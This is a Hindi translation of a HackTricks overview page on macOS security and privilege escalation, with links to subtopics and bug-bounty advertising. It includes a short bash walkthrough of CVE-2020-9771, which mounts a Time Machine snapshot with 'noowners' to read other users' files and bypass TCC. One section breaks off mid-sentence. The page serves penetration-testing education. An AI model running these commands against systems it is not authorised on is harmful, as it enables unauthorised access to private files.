# macOS सुरक्षा और प्रिविलेज एस्केलेशन

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की इच्छा है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष संग्रह [**NFTs**](https://opensea.io/collection/the-peass-family)
* [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com) प्राप्त करें
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में **या** मुझे **Twitter** पर **फ़ॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **अपने हैकिंग ट्रिक्स साझा करें और PR जमा करके** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **को** **फ़ॉलो** करें।

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof में सभी क्रिप्टो बग बाउंटी होती है।**

**देरी के बिना पुरस्कार प्राप्त करें**\
HackenProof बाउंटी केवल तब शुरू होती हैं जब उनके ग्राहक इनाम बजट जमा करते हैं। बग सत्यापित होने के बाद आपको इनाम मिलेगा।

**वेब3 पेंटेस्टिंग में अनुभव प्राप्त करें**\
ब्लॉकचेन प्रोटोकॉल और स्मार्ट कॉन्ट्रैक्ट्स नई इंटरनेट हैं! उनके उभरते दिनों में वेब3 सुरक्षा को मास्टर करें।

**वेब3 हैकर लीजेंड बनें**\
प्रतिस्पर्धा सूचकांक के साथ प्रत्येक सत्यापित बग के साथ प्रतिष्ठा अंक प्राप्त करें और साप्ताहिक लीडरबोर्ड के शीर्ष पर विजयी बनें।

[**HackenProof पर साइन अप करें**](https://hackenproof.com/register) और अपने हैक्स से कमाई करें!

{% embed url="https://hackenproof.com/register" %}

## मूल MacOS

यदि आप macOS के बारे में अनजान हैं, तो आपको macOS की मूल बातें सीखनी चाहिए:

* विशेष macOS **फ़ाइलें और अनुमतियाँ:**

{% content-ref url="macos-files-folders-and-binaries/" %}
[macos-files-folders-and-binaries](macos-files-folders-and-binaries/)
{% endcontent-ref %}

* सामान्य macOS **उपयोगकर्ता**

{% content-ref url="macos-users.md" %}
[macos-users.md](macos-users.md)
{% endcontent-ref %}

* **AppleFS**

{% content-ref url="macos-applefs.md" %}
[macos-applefs.md](macos-applefs.md)
{% endcontent-ref %}

* कर्नल की **वास्तुकला**

{% content-ref url="mac-os-architecture/" %}
[mac-os-architecture](mac-os-architecture/)
{% endcontent-ref %}

* सामान्य macOS नेटवर्क सेवाएं और प्रोटोकॉल्स**

{% content-ref url="macos-protocols.md" %}
[macos-protocols.md](macos-protocols.md)
{% endcontent-ref %}

* **ओपनसोर्स** macOS: [https://opensource.apple.com/](https://opensource.apple.com/)
* `tar.gz` डाउनलोड करने के लिए URL में बदलाव करें, जैसे [https://opensource.apple.com/**source**/dyld/](https://opensource.apple.com/source/dyld/) को [https://opensource.apple.com/**tarballs**/dyld/**dyld-852.2.tar.gz**](https://opensource.apple.com/tarballs/dyld/dyld-852.2.tar.gz) में बदलें

### MacOS MDM

कंपनियों में **macOS** सिस्टमों को बहुत संभावित रूप से **एमडीएम के साथ प्रबंधित** किया जाएगा। इसलिए, एक हमलावर के दृष्टिकोण से यह जानना महत्वपूर्ण है कि **यह कैसे काम करता है**:

{% content-ref url="../macos-red-teaming/macos-mdm/" %}
[macos-mdm](../macos-red-teaming/macos-mdm/)
{% endcontent-ref %}

### MacOS - निरीक्षण, डीबगिंग और फ़ज़िंग

{% content-ref url="macos-apps-inspecting-debugging-and-fuzzing/" %}
[macos-apps-inspecting-debugging-and-fuzzing](macos-apps-inspecting-debugging-and-fuzzing/)
{% endcontent-ref %}

## MacOS सुरक्षा संरक्षण

{% content-ref url="macos-security-protections/" %}
[macos-security-protections](macos-security-protections/)
{% endcontent-ref %}

## हमला सतह

### फ़ाइल अनुमतियाँ

यदि एक **रूट के रूप में चल रही प्रक्रिया एक फ़ाइल लिखती है** जिसे उपयोगकर्ता नियंत्रित कर सकता है, तो उपयोगकर्ता इसे **प्रिविलेज एस्केलेशन** के लिए उपयोग कर सकता है।\
यह निम्नलिखित स्थ
### अधिकार और विशेषाधिकारों का दुरुपयोग प्रक्रिया द्वारा

यदि कोई प्रक्रिया दूसरी प्रक्रिया में कोड इंजेक्शन कर सकती है जिसमें बेहतर विशेषाधिकार या अधिकार होते हैं या उससे संपर्क करके विशेषाधिकार क्रियाएं कर सकती है, तो वह विशेषाधिकारों को बढ़ा सकती है और [सैंडबॉक्स](macos-security-protections/macos-sandbox/) या [TCC](macos-security-protections/macos-tcc/) जैसी सुरक्षा उपायों को छोड़कर बच सकती है।

{% content-ref url="macos-proces-abuse/" %}
[macos-proces-abuse](macos-proces-abuse/)
{% endcontent-ref %}

### फ़ाइल एक्सटेंशन और URL स्कीम ऐप हैंडलर

अजीब ऐप्स फ़ाइल एक्सटेंशन द्वारा पंजीकृत किए जा सकते हैं और विभिन्न एप्लिकेशन विशेष प्रोटोकॉल खोलने के लिए पंजीकृत किए जा सकते हैं

{% content-ref url="macos-file-extension-apps.md" %}
[macos-file-extension-apps.md](macos-file-extension-apps.md)
{% endcontent-ref %}

## MacOS विशेषाधिकार उन्नयन

### CVE-2020-9771 - mount\_apfs TCC बाईपास और विशेषाधिकार उन्नयन

**कोई भी उपयोगकर्ता** (यहां तक कि अनाधिकृत उपयोगकर्ता भी) एक टाइम मशीन स्नैपशॉट बना सकता है और माउंट कर सकता है और उस स्नैपशॉट के **सभी फ़ाइलों तक पहुंच** कर सकता है।\
इसके लिए, उपयोग की जाने वाली एप्लिकेशन (जैसे `Terminal`) को **पूर्ण डिस्क एक्सेस** (FDA) एक्सेस (`kTCCServiceSystemPolicyAllfiles`) होना चाहिए, जिसे एडमिन द्वारा प्रदान किया जाना चाहिए।

{% code overflow="wrap" %}
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
{% endcode %}

एक अधिक विस्तृत व्याख्या [**मूल रिपोर्ट में मिल सकती है**](https://theevilbit.github.io/posts/cve\_2020\_9771/)**.**

### संवेदनशील जानकारी

{% content-ref url="macos-files-folders-and-binaries/macos-sensitive-locations.md" %}
[macos-sensitive-locations.md](macos-files-folders-and-binaries/macos-sensitive-locations.md)
{% endcontent-ref %}

### Linux Privesc

सबसे पहले, कृपया ध्यान दें कि **लिनक्स/यूनिक्स पर विशेषाधिकार उन्नयन के बारे में अधिकांश तरीके भी MacOS मशीनों पर प्रभावित करेंगे**। इसलिए देखें:

{% content-ref url="../../linux-hardening/privilege-escalation/" %}
[privilege-escalation](../../linux-hardening/privilege-escalation/)
{% endcontent-ref %}

## MacOS रक्षात्मक ऐप्स

## संदर्भ

* [**OS X Incident Response: Scripting and Analysis**](https://www.amazon.com/OS-Incident-Response-Scripting-Analysis-ebook/dp/B01FHOHHVS)
* [**https://taomm.org/vol1/analysis.html**](https://taomm.org/vol1/analysis.html)
* [**https://github.com/NicolasGrimonpont/Cheatsheet**](https://github.com/NicolasGrimonpont/Cheatsheet)
* [**https://assets.sentinelone.com/c/sentinal-one-mac-os-?x=FvGtLJ**](https://assets.sentinelone.com/c/sentinal-one-mac-os-?x=FvGtLJ)
* [**https://www.youtube.com/watch?v=vMGiplQtjTY**](https://www.youtube.com/watch?v=vMGiplQtjTY)

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof क्रिप्टो बग बाउंटी का घर है।**

**देरी के बिना पुरस्कार प्राप्त करें**\
HackenProof बाउंटी तब शुरू होती है जब उनके ग्राहक इनाम बजट जमा करते हैं। आपको इनाम उस बग के सत्यापित होने के बाद मिलेगा।

**वेब3 पेंटेस्टिंग में अनुभव प्राप्त करें**\
ब्लॉकचेन प्रोटोकॉल और स्मार्ट कॉन्ट्रैक्ट्स नई इंटरनेट हैं! उनके उभरते दिनों में वेब3 सुरक्षा को मास्टर करें।

**वेब3 हैकर लीजेंड बनें**\
प्रत्येक सत्यापित बग के साथ प्रतिष्ठा अंक प्राप्त करें और साप्ताहिक लीडरबोर्ड के शीर्ष पर विजयी बनें।

[**HackenProof पर साइन अप करें**](https://hackenproof.com/register) और अपने हैक्स से कमाई करना शुरू करें!

{% embed url="https://hackenproof.com/register" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप किसी **साइबर सुरक्षा कंपनी में काम करते हैं**? क्या आप चाहते हैं कि आपकी **कंपनी HackTricks में विज्ञापित हो**? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग करने की सुविधा चाहिए**? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा एकल [**NFT**](https://opensea.io/collection/the-peass-family) संग्रह
* [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com) प्राप्त करें
* **[💬](https://emojipedia.org/speech-balloon/) [Discord समूह](https://discord.gg/hRep4RUj7f) या [telegram समूह](https://t.me/peass) में शामिल हों** या मुझे **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)** का** अनुसरण करें।
* **अपने हैकिंग ट्रिक्स साझा करें, PRs सबमिट करके** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **में।**

</details>
